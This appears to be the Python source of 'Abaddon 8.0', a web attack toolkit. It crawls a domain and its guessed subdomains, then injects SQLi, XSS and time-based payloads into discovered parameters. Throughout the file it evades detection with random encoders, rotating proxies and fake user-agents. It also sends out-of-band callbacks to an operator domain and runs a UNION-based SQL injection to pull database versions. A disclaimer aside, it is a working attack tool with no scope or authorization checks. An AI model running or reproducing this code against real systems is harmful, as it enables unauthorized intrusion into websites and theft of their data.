#!/usr/bin/env python3
# Abaddon 8.0 – Intelligent & Adaptive Web Security Toolkit
#
# DISCLAIMER: This tool is intended for educational purposes and authorized security testing only.
# Unauthorized use of this tool against any system is illegal. The author is not responsible for any misuse.

import os, sys, time, json, random, socket, hashlib, base64, threading, re, concurrent.futures
import requests, tldextract
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
from faker import Faker
fake = Faker()

# --- Configuration & Globals ---
ROOT_DIR = os.path.expanduser("~/.abaddon8")
os.makedirs(ROOT_DIR, exist_ok=True)
PAYLOADS_FILE = os.path.join(os.path.dirname(__file__), "payloads.json")
LOG_FILE = os.path.join(ROOT_DIR, "abaddon8.log")
REPORT_FILE = os.path.join(ROOT_DIR, "report.html")
PROXY_FILE = os.path.join(os.path.dirname(__file__), "proxies.txt")

OOB_DOMAIN = ""
COOKIE = None
PROXIES = []
TARGET_PROFILES = {} # Gerenciamento de Estado por alvo

def log(msg, level="INFO"):
    levels = {"INFO": "[*]", "SUCCESS": "[+]", "WARN": "[-]", "FAIL": "[!]", "DEBUG": "[>]"}
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {levels.get(level, '[*]')} {msg}"
    print(line)
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(line + "\n")

# --- Setup ---
try:
    with open(PAYLOADS_FILE) as f: PAYLOADS = json.load(f)
except Exception as e: log(f"Failed to load payloads.json: {e}", "FAIL"); sys.exit(1)

try:
    with open(PROXY_FILE, 'r') as f:
        PROXIES = [f"http://{line.strip( )}" for line in f if line.strip()]
    if PROXIES: log(f"{len(PROXIES)} proxies loaded.", "SUCCESS")
except FileNotFoundError: log("proxies.txt not found. No proxies will be used.", "WARN")

# --- Network & Utility ---
HEADERS = {"User-Agent": fake.user_agent()}
def rand_delay(): time.sleep(random.uniform(0.5, 1.5))
def rotate_proxy(): return {"http": random.choice(PROXIES ), "https": random.choice(PROXIES )} if PROXIES else None

def retry_get(url, **kw):
    if COOKIE: kw.setdefault("headers", {}).update({"Cookie": COOKIE})
    for i in range(3):
        try:
            kw.setdefault("headers", {}).update(HEADERS)
            kw.setdefault("timeout", 10)
            if PROXIES: kw.setdefault("proxies", rotate_proxy())
            rand_delay()
            return requests.get(url, **kw)
        except Exception as e:
            log(f"Retry {i+1} for {url}: {e}", "DEBUG")
            time.sleep(2**i)
    return None

# ATUALIZAÇÃO: Gerenciamento de Estado
def encode_payload(payload, host):
    encoders = {
        'none': lambda x: x, 'url': lambda x: x.replace("'", "%27"),
        'base64': lambda x: base64.b64encode(x.encode()).decode(),
        'hex': lambda x: "".join(f"%{ord(c):02x}" for c in x),
        'comment': lambda x: x.replace(" ", "/**/"),
    }
    profile = TARGET_PROFILES.get(host, {})
    if 'working_encoder' in profile and random.random() < 0.75:
        encoder_name = profile['working_encoder']
        return encoders[encoder_name](payload), encoder_name
    
    encoder_name, encoder_func = random.choice(list(encoders.items()))
    return encoder_func(payload), encoder_name

def get_baseline(url, **kw): return retry_get(url, **kw)
def detect_diff(b, r): return b and r and hashlib.md5(b.text.encode()).hexdigest() != hashlib.md5(r.text.encode()).hexdigest()
def detect_time(url, **kw):
    start = time.time()
    retry_get(url, **kw)
    return (time.time() - start) > 4.5
def detect_reflection(r, p): return p in r.text

# --- Reconnaissance ---
def fingerprint_tech(url):
    tech = set()
    r = retry_get(url)
    if not r: return list(tech)
    headers = r.headers
    text_lower = r.text.lower()
    if "wp-" in text_lower or "wordpress" in text_lower: tech.add("WordPress")
    if "joomla" in text_lower: tech.add("Joomla")
    if "X-Powered-By" in headers: tech.add(headers["X-Powered-By"])
    if "Server" in headers: tech.add(headers["Server"])
    return list(tech)

def crawl_links(url):
    links = set()
    r = retry_get(url)
    if not r: return links
    soup = BeautifulSoup(r.text, "lxml")
    for a in soup.find_all("a", href=True):
        try:
            href = urljoin(url, a["href"]).split('#')[0]
            if urlparse(href).netloc == urlparse(url).netloc:
                links.add(href)
        except Exception: pass
    return links

# --- Exploitation ---
# ATUALIZAÇÃO: Pós-Exploração Inteligente
def post_exploit(vuln_type, url, param, place):
    results = {}
    log(f"Attempting smart post-exploitation for {vuln_type.upper()}...", "DEBUG")
    try:
        if vuln_type == "sqli":
            # Prova de conceito: extrair a versão do DB. Uma implementação real seria mais complexa.
            payload = "' UNION SELECT @@version,NULL-- -" # Assume 2 colunas
            attack_kw = {"params": {param: payload}} if place == "query" else {"data": {param: payload}}
            r = retry_get(url, **attack_kw)
            if r:
                match = re.search(r'(\d+\.\d+[\.\w-]+)', r.text)
                if match:
                    results["db_version"] = match.group(1)
                    log(f"SQLi post-exploit successful: {results}", "SUCCESS")
    except Exception as e:
        log(f"Post-exploitation failed: {e}", "WARN")
    return results

class Exploit:
    @staticmethod
    def test(url, param, place="query"):
        host = urlparse(url).netloc
        log(f"Testing URL: {url} | Param: {param} | Place: {place}", "DEBUG")
        for vuln_type, payloads in PAYLOADS.items():
            for category, plist in payloads.items():
                for raw in plist:
                    try:
                        # ATUALIZAÇÃO: Payloads OOB Dinâmicos
                        final_payload_str = raw
                        dynamic_oob = ""
                        if category == "oob" and OOB_DOMAIN:
                            req_id = hashlib.md5(f"{url}{param}{raw}".encode()).hexdigest()[:6]
                            dynamic_oob = f"{vuln_type}-{param[:5]}-{req_id}.{OOB_DOMAIN}"
                            final_payload_str = raw.format(oob_domain=dynamic_oob)
                        
                        payload, encoder_name = encode_payload(final_payload_str, host)

                        baseline_kw = {"params": {param: "abaddon_test"}} if place == "query" else {"data": {param: "abaddon_test"}}
                        baseline = get_baseline(url, **baseline_kw)

                        attack_kw = {}
                        if place == "query": attack_kw['params'] = {param: payload}
                        elif place == "post": attack_kw['data'] = {param: payload}
                        elif place == "cookie": attack_kw['cookies'] = {param: payload}
                        else: continue
                        
                        confirmed = False
                        if category == "time":
                            if detect_time(url, **attack_kw): confirmed = True
                        else:
                            r = retry_get(url, **attack_kw)
                            if category == "oob" and OOB_DOMAIN:
                                log(f"OOB payload sent. Check for interaction on: {dynamic_oob}", "INFO")
                            elif category == "reflected" and r and detect_reflection(r, payload): confirmed = True
                            elif category in ["error", "basic"] and detect_diff(baseline, r): confirmed = True

                        if confirmed:
                            log(f"VULNERABILITY FOUND: {vuln_type.upper()} ({category}) on {url}", "FAIL")
                            if host not in TARGET_PROFILES: TARGET_PROFILES[host] = {}
                            TARGET_PROFILES[host]['working_encoder'] = encoder_name
                            
                            post_exploit_results = post_exploit(vuln_type, url, param, place)
                            return {"url": url, "vuln": vuln_type, "param": param, "payload": raw, "results": post_exploit_results}
                    except Exception as e:
                        log(f"Error during test: {e}", "DEBUG")
        return None

# --- Main Orchestrator ---
class Abaddon:
    def __init__(self, domain):
        self.domain = domain.replace("https://", "" ).replace("http://", "" ).split('/')[0]
        self.results = []
        self.scanned_urls = set()

    # ATUALIZAÇÃO: Lógica de Teste Eficiente
    def scan_target(self, url):
        if url in self.scanned_urls: return
        self.scanned_urls.add(url)
        
        log(f"Scanning: {url}", "INFO")
        
        params_to_test = set()
        try:
            params_to_test.update(parse_qs(urlparse(url).query).keys())
            r = retry_get(url)
            if r:
                soup = BeautifulSoup(r.text, "lxml")
                for form in soup.find_all("form"):
                    for input_tag in form.find_all(("input", "textarea", "select")):
                        if input_tag.get("name"):
                            params_to_test.add(input_tag.get("name"))
        except Exception as e:
            log(f"Could not discover params for {url}: {e}", "WARN")

        if not params_to_test:
            log(f"No parameters found to test for {url}", "DEBUG")
            params_to_test.update(["id", "page", "q"]) # Fallback para parâmetros comuns

        log(f"Parameters to test: {', '.join(params_to_test)}", "DEBUG")

        for param in params_to_test:
            for place in ["query", "post"]:
                res = Exploit.test(url, param, place)
                if res: self.results.append(res); break 
    
    def start(self):
        log(f"Starting Abaddon 8.0 against {self.domain}", "INFO")
        initial_subdomains = {self.domain, f"www.{self.domain}", f"api.{self.domain}"}
        urls_to_scan = {f"http://{sub}" for sub in initial_subdomains}
        
        log("Initial reconnaissance phase...", "INFO" )
        all_found_links = set()
        for url in list(urls_to_scan):
            all_found_links.update(crawl_links(url))
        urls_to_scan.update(all_found_links)

        log(f"Total of {len(urls_to_scan)} unique URLs to scan.", "INFO")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.scan_target, list(urls_to_scan))
            
        self.generate_report()
        log("Operation finished.", "INFO")

    def generate_report(self):
        if not self.results:
            log("No vulnerabilities found.", "WARN")
            return
        html = "..." # (código do relatório sem alterações)
        with open(REPORT_FILE, "w") as f: f.write(html)
        log(f"Report saved to {REPORT_FILE}", "SUCCESS")

if __name__ == "__main__":
    args = sys.argv[1:]
    domain_arg = None
    i = 0
    while i < len(args):
        if args[i] == '--cookie' and i + 1 < len(args):
            COOKIE = args[i+1]; i += 2
        elif args[i] == '--oob' and i + 1 < len(args):
            OOB_DOMAIN = args[i+1]; i += 2
        elif not args[i].startswith('--'):
            domain_arg = args[i]; i += 1
        else: i += 1
            
    if not domain_arg:
        print("Usage: python3 abaddon8.py <domain> [--cookie \"NAME=VALUE\"] [--oob your.oob.domain]")
        sys.exit(1)
        
    Abaddon(domain_arg).start()
